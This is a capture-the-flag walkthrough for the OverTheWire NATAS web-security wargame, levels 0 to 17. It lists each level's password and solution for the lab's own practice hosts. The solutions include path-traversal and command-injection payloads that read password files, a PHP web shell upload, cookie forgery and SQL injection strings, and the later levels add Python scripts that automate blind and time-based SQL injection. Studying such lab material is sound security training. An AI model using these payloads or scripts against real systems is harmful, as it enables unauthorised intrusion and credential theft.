NATAS-Over The Wire
===================

level-0:
-------
password: gtVrDuiDfck831PqWsLEZy5gyDz1clto 

solution: look the page source

level-1:
--------
password: ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi

solution: looking athe pagesource,right-clicking is blocked so we have to use ctrl+u key combination to view page-source 

level-2:
--------
password: sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14


solution: looking trough the page source we find a image link ``files/pixel.png`` ,when we look at the ``/files`` dir-listing is enabled 	there is user.txt and you can find the password inside that file 


level-3:
--------
password: Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ

solution: look at the robots.txt you can find ``/s3cr3t/`` when we go to that we can see a user.txt and we can see the password inside that file

	
level-4:
-------
password: iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq 

solution: we have to change the Referer header to ``http://natas5.natas.labs.overthewire.org/``

level-5:
--------
password: aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1

solution: we want to change the cookiee "loggedin" from 0 to 1.


level-6:
--------

password: 7z3hEENjQtflzgnT29q7wAvMNfZdh0i9 

solution: here we want to pass the correct secret,by looing into the "view sourcecode" we can see the php source-code and in that it is including ``includes/secret.inc`` to the page so i browsed to that page and in the source of the page we can find the secret
	
level-7:
-------

password: DBfUBfqQG69KvJvJ1iAbMoIpwSNQ9bWe 

solution: LFI,pyaload to the page parameter ``/../../../etc/natas_webpass/natas8``

level-8:
-------

password: W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl 

solution: looking through the source of the page our input is passed to a ``encodeSecret`` function and it compares to a string in the code so we just have to reverse the function , take that string and then do hex2bin() and then strrrev() and then base64_decode(), and we will get the serect
	
level-9:
-------

password: nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu

solution: by looking through the php sourcecode we can see that our input is passed into passthru() finction which will exicute the grep command ,so we can have os command injection vulnerablity here and just by putting ``;`` after that what commant we give will be exicuted on the server

payload: 
```bash
; cat /../../../etc/natas_webpass/natas10
```
	
level-10:
-------

password:  U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK

solution: here there are some fileter so we cannot directly inject commands,so we can use the grep command to show all the text in ``/../../../etc/natas_webpass/natas10`` file

payload: ``.* ../../../../etc/natas_webpass/natas11``

level-11:
-------

password: EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3

solution: when we view the php  source code of the page ,it xor encrypting the jason encoded "showpassword"=>"no", "bgcolor"=>"#ffffff" and then base64 endcoded and store it as cookie ,it is checking that "showpassword" value is "yes" only then we can see the password,so we can decode the cookie using the same function to get the xor key and change the ``"showpassword"=>"yes"`` in that arry,then xor encrypt and base64 encode and put it as the cookie data value

final payload: ClVLIh4ASCsCBE8lAxMacFMOXTlTWxooFhRXJh4FGnBTVF4sFxFeLFMK(set this as the data cookie value)

level-12:
-------

password: jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY 

solution: in the website there is an upload function and we can upload a php file ,but the filename and extension is generated by the webapp ,we can change the extention using burp suite

final php code:
```php
<?php system("cat /../../../../etc/natas_webpass/natas13"); ?>
```


level-13:
-------

password:  Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1

solution:  here it cheks for an image type so we can add some magic bytes of the jpeg files to pass that check 
	
level-14:
-------

password: AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J

solution: sql injection

payload :   ``" or 1=1 --+``(put it in the input feild)
	
level-15:
-------
password: WaIHEacj63wnNIBROHeqi3p9t0m5nhmh

solution: here blind sql injection is possible , it check for the username exists ,we can see that nata16 exists so we want to find the password of natas16
	
python exploit:
```python
#!/usr/bin/python3

import requests
import string


req=requests.Session()
url='http://natas15.natas.labs.overthewire.org/index.php'
auth={'Authorization': 'Basic bmF0YXMxNTpBd1dqMHc1Y3Z4clppT05nWjlKNXN0TlZrbXhkazM5Sg=='}
req.headers.update(auth)
r=req.post(url,headers=auth)
p="natas16 \" and ord(substr(password,{},1))={}#"
chrs=string.ascii_letters+string.digits
password=''
for j in range(1,33):
	for i in chrs:
		i=ord(i)
		payload=p.format(j,i)
		data={"username":payload}
		r1=req.post(url,data=data)
		if "This user exists." in r1.text:
			  password+=chr(i)
			  break
			
print(password)

```

level-16:
-------

password: 8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw

solution: 
```python
#!/usr/bin/python3
import requests
import string

req=requests.Session()
auth={'Authorization' :'Basic bmF0YXMxNjpXYUlIRWFjajYzd25OSUJST0hlcWkzcDl0MG01bmhtaA=='}
url='http://natas16.natas.labs.overthewire.org/index.php'
req.headers.update(auth)
payload='?needle=bells$(grep ^{} /etc/natas_webpass/natas17 )&submit=Search'
chars='bcdghkmnqrswAGHNPQSW035789'
password=''

for j in range(33):
	for i in chars:
		a=password+i
		p=payload.format(a)
		u=url+p
		r=req.get(u)
		if 'bells' not in r.text:
			password+=i
			print(password)
			break
			
```

level-17:
-------

password:  xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP

solution: 
```python
#!/usr/bin/python3

import requests
import string


req=requests.Session()
url='http://natas17.natas.labs.overthewire.org/index.php'
auth={'Authorization': 'Basic bmF0YXMxNzo4UHMzSDBHV2JuNXJkOVM3R21BZGdRTmRraFBrcTljdw=='}
req.headers.update(auth)
r=req.post(url,headers=auth)
p="natas18\" and ord(substr(password,{},1))={} and sleep(2) #"
chrs=string.ascii_letters+string.digits
password=''
for j in range(1,33):
    for i in chrs:
        i=ord(i)
        payload=p.format(j,i)
        print(payload)
        data={"username":payload}
        r1=req.post(url,data=data)
        time=r1.elapsed.seconds
        if time==2:
            print(j,chr(i))
            password+=chr(i)
            break




print(password)

```
	
	
	
	
	
	

